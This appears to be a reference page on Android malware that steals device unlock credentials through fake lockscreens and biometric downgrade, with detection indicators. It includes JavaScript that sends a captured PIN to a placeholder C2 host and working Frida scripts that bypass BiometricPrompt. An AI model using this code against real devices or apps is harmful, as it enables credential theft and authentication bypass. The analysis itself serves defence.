# Fake Biometric Prompts

Stealing device unlock credentials through fake lockscreens and abusing the BiometricPrompt API. Distinct from standard overlay phishing, which targets banking app credentials. This technique captures the device PIN, password, or unlock pattern, giving attackers the ability to unlock the device during remote access sessions and bypass device encryption at rest.

!!! warning "Requirements"

    | Requirement | Details |
    |-------------|---------|
    | Permission | `BIND_ACCESSIBILITY_SERVICE` or `SYSTEM_ALERT_WINDOW` |
    | Trigger | Device lock event or `USER_PRESENT` broadcast |

## Android Biometric Architecture

Understanding the legitimate API is necessary to understand how it is abused.

### Biometric Classes

Android categorizes biometric hardware into three strength tiers defined in `BiometricManager.Authenticators`:

| Class | Strength | Hardware | Use Cases |
|-------|----------|----------|-----------|
| Class 3 (Strong) | Spoofing acceptance rate < 7% | Fingerprint sensors, structured-light face (Pixel, iPhone-style) | Keystore-bound crypto, payments |
| Class 2 (Weak) | Spoofing acceptance rate < 20% | Camera-based face unlock on most Android OEMs | App unlock, non-crypto auth |
| Class 1 (Convenience) | No spoofing requirements | Basic face detection | Screen unlock only, not available to apps |

### BiometricPrompt API

Introduced in Android 9 to unify fingerprint and face authentication. Apps call `BiometricPrompt.authenticate()` with an optional `CryptoObject` binding a `Cipher`, `Signature`, or `Mac` to the biometric gate.

```java
BiometricPrompt prompt = new BiometricPrompt(activity, executor, callback);
BiometricPrompt.PromptInfo info = new BiometricPrompt.PromptInfo.Builder()
    .setTitle("Verify identity")
    .setNegativeButtonText("Use PIN")
    .setAllowedAuthenticators(BiometricManager.Authenticators.BIOMETRIC_STRONG)
    .build();

Cipher cipher = getCipherFromKeystore();
prompt.authenticate(info, new BiometricPrompt.CryptoObject(cipher));
```

### CryptoObject Binding

When `CryptoObject` is used, the Keystore key is configured with `setUserAuthenticationRequired(true)`. The key becomes usable only after successful biometric authentication. The TEE/StrongBox releases the key material only when the biometric HAL reports a match.

Without `CryptoObject`, authentication is purely callback-based: the app trusts the `onAuthenticationSucceeded` callback without any cryptographic proof. This is the weakness that Frida-based bypasses and malware exploit.

## Fake Lockscreen Overlays

### TrickMo's Approach

[TrickMo](../malware/families/trickmo.md) deploys a full-screen overlay that replicates the device lockscreen. [Cleafy first documented this behavior](https://thehackernews.com/2024/09/trickmo-android-trojan-exploits.html) in September 2024, with [Zimperium identifying 40+ variants](https://thehackernews.com/2024/10/trickmo-banking-trojan-can-now-capture.html) using this technique across 16 droppers.

The fake lockscreen is an HTML page hosted externally and rendered full-screen in a `WebView` overlay:

1. The malware monitors for device lock events via accessibility
2. When the screen turns on after lock, the malware displays its overlay before the real lockscreen renders
3. The HTML page mimics the OEM-specific lockscreen (Samsung, Pixel, Xiaomi, etc.)
4. The user enters their PIN into the fake overlay
5. The entered PIN is exfiltrated to C2
6. The overlay dismisses and the real lockscreen appears, which the user unlocks normally, unaware of the theft

The HTML page uses JavaScript to capture each digit:

```html
<div id="pin-dots">
    <span class="dot"></span>
    <span class="dot"></span>
    <span class="dot"></span>
    <span class="dot"></span>
</div>
<div id="keypad">
    <button onclick="enterDigit(1)">1</button>
    <button onclick="enterDigit(2)">2</button>
    <button onclick="enterDigit(3)">3</button>
</div>
<script>
var pin = "";
function enterDigit(d) {
    pin += d;
    document.querySelectorAll(".dot")[pin.length-1].classList.add("filled");
    if (pin.length === 4) {
        new Image().src = "https://c2.example/pin?v=" + pin;
    }
}
</script>
```

Zimperium's analysis of leaked C2 data revealed 12 GB of exfiltrated data including device PINs, banking credentials, and photos from compromised devices.

### TsarBot's Pattern Capture

[TsarBot](../malware/families/tsarbot.md), [discovered by Cyble in March 2025](https://cyble.com/blog/tsarbot-using-overlay-attacks-targeting-bfsi-sector/), extends the technique to capture unlock patterns in addition to PINs. TsarBot implements a `LockTypeDetector` that uses accessibility to determine the device's lock method:

| Lock Type | Detection Method | Capture Technique |
|-----------|-----------------|-------------------|
| PIN | Accessibility reads "PIN area" text on lockscreen | Keypad overlay |
| Password | Accessibility reads "Password" text | Text field overlay |
| Pattern | Accessibility reads pattern-related descriptions | Touch tracking on pattern grid overlay |

TsarBot captures patterns by tracking touch coordinates on a fake 3x3 grid rendered as an overlay. The `USER_PRESENT` broadcast triggers the fake lockscreen on first unlock after boot. Pattern data is serialized as a sequence of node indices (e.g., `0,1,2,5,8` for an L-shape) and sent to C2.

### Differences from Banking Overlays

| Aspect | Banking Overlay | Fake Lockscreen |
|--------|----------------|-----------------|
| Target | App credentials | Device unlock credential |
| Trigger | Target app opened | Device lock/unlock event |
| Appearance | Mimics banking app login | Mimics system lockscreen |
| Purpose | Account takeover | Device access during RAT sessions |
| Persistence value | Single-use per target | Permanent device access |

## Biometric Downgrade Attacks

Rather than spoofing biometrics, the attacker forces the device to fall back to PIN/password entry, then captures it.

### Chameleon's interrupt_biometric

[Chameleon](../malware/families/chameleon.md) [introduced this in December 2023](https://www.threatfabric.com/blogs/android-banking-trojan-chameleon-is-back-in-action). Upon receiving the `interrupt_biometric` command from C2, the malware:

1. Uses accessibility to open Settings > Security > Biometrics
2. Navigates to fingerprint settings
3. Disables fingerprint unlock by toggling it off
4. Repeats for face unlock if present
5. The device now requires PIN/password for all unlock operations
6. Keylogger captures the PIN on next unlock

This works on Android 13+ where the accessibility service has sufficient privileges. The user sees biometrics as "disabled" but may attribute it to a system update or glitch.

### API-Level Downgrade

Apps that call `BiometricPrompt` with `setAllowedAuthenticators(BIOMETRIC_STRONG | DEVICE_CREDENTIAL)` allow fallback to PIN. The user sees a "Use PIN" button on the biometric dialog. Malware with accessibility can click this button to force PIN entry, then capture the keystrokes.

## Frida-Based BiometricPrompt Bypass

For security researchers and during dynamic analysis, BiometricPrompt can be bypassed with Frida when `CryptoObject` is not used.

### Callback-Only Authentication (No CryptoObject)

When the app does not bind a `CryptoObject`, the authentication is purely callback-based. Frida hooks `BiometricPrompt.authenticate()` and immediately triggers `onAuthenticationSucceeded`:

```javascript
Java.perform(function() {
    var BiometricPrompt = Java.use("androidx.biometric.BiometricPrompt");
    var AuthResult = Java.use("androidx.biometric.BiometricPrompt$AuthenticationResult");
    var CryptoObject = Java.use("androidx.biometric.BiometricPrompt$CryptoObject");

    BiometricPrompt.authenticate.overload(
        "androidx.biometric.BiometricPrompt$PromptInfo"
    ).implementation = function(info) {
        var callback = this.mAuthenticationCallback.value;
        var result = AuthResult.$new.overload(
            "androidx.biometric.BiometricPrompt$CryptoObject"
        ).call(AuthResult, null);
        callback.onAuthenticationSucceeded(result);
    };
});
```

This script intercepts the authenticate call, skips the actual biometric check, and fires the success callback with a null `CryptoObject`. The app proceeds as if authentication succeeded.

### CryptoObject-Bound Authentication

When the app uses `CryptoObject`, the Keystore key is locked behind biometric authentication in hardware. A null `CryptoObject` bypass causes a `javax.crypto.IllegalBlockSizeException` when the app tries to use the cipher.

To bypass CryptoObject-bound authentication:

1. Hook `KeyGenParameterSpec.Builder.setUserAuthenticationRequired` to return `false`
2. Regenerate the key without biometric binding
3. Use the unbound key for encryption/decryption

```javascript
Java.perform(function() {
    var KeyGenSpec = Java.use(
        "android.security.keystore.KeyGenParameterSpec$Builder"
    );
    KeyGenSpec.setUserAuthenticationRequired.implementation = function(required) {
        return this.setUserAuthenticationRequired(false);
    };
});
```

This requires the app to regenerate its key, so it is not always applicable to existing sessions.

### Legacy FingerprintManager

Older apps targeting pre-Android 9 may still use the deprecated `FingerprintManager`. The same callback-hooking approach applies, targeting `FingerprintManager$AuthenticationCallback.onAuthenticationSucceeded`.

## Biometric Class Implications for Attackers

| Class | Keystore Binding | Frida Bypass | Overlay Feasible | Notes |
|-------|-----------------|--------------|------------------|-------|
| Class 3 | Supported | Only if app skips CryptoObject | No (system-drawn prompt) | Hardware-enforced, hardest to bypass |
| Class 2 | Not supported | Yes (callback-only) | Possible | Camera-based, easier to spoof |
| Class 1 | Not available to apps | N/A | N/A | Screen unlock only |

Apps using `BIOMETRIC_STRONG` with `CryptoObject` are resistant to both Frida callback bypass and overlay attacks because the BiometricPrompt is drawn by the system (not the app) and the cryptographic key is hardware-bound.

Apps using `BIOMETRIC_WEAK` or omitting `CryptoObject` are vulnerable to both approaches.

## Family Comparison

| Family | Technique | Target | Year |
|--------|-----------|--------|------|
| [TrickMo](../malware/families/trickmo.md) | Full-screen HTML lockscreen overlay | PIN | 2024 |
| [TsarBot](../malware/families/tsarbot.md) | Lockscreen overlay with pattern tracking | PIN, password, pattern | 2025 |
| [Chameleon](../malware/families/chameleon.md) | Biometric disable via accessibility | PIN (via keylogging after downgrade) | 2023 |
| [GoldPickaxe](../malware/families/goldpickaxe.md) | Fake biometric prompt to capture face video | Facial biometric data | 2024 |
| [Hook](../malware/families/hook.md) | Screen streaming during biometric entry | Observe PIN entry via VNC | 2023 |
| [Cerberus](../malware/families/cerberus.md) | Keylogging during PIN entry | PIN | 2019 |

## Detection During Analysis

??? example "Static Indicators"

    - HTML files matching lockscreen UI patterns in assets or downloaded from C2
    - References to `USER_PRESENT` broadcast action
    - Accessibility service monitoring lock/unlock events
    - JavaScript with PIN/pattern capture logic
    - `BiometricPrompt` or `FingerprintManager` references in non-authentication contexts

??? example "Dynamic Indicators"

    - Overlay appearing at device unlock rather than app launch
    - Full-screen WebView rendered during lock-to-unlock transition
    - Network request containing numeric or pattern data immediately after unlock
    - Accessibility events targeting Security settings to disable biometrics

## Cross-References

- [Overlay Attacks](overlay-attacks.md) -- the foundational overlay technique; fake lockscreens are a specialized variant
- [Accessibility Abuse](accessibility-abuse.md) -- accessibility enables both the overlay display and biometric disabling
- [Keylogging](keylogging.md) -- captures PINs after biometric downgrade forces PIN entry
- [Runtime Permission Manipulation](runtime-permission-manipulation.md) -- biometric downgrade is one form of accessibility-based device manipulation
- [TrickMo](../malware/families/trickmo.md) -- primary family using fake lockscreen PIN capture
- [TsarBot](../malware/families/tsarbot.md) -- extends technique to pattern and password capture
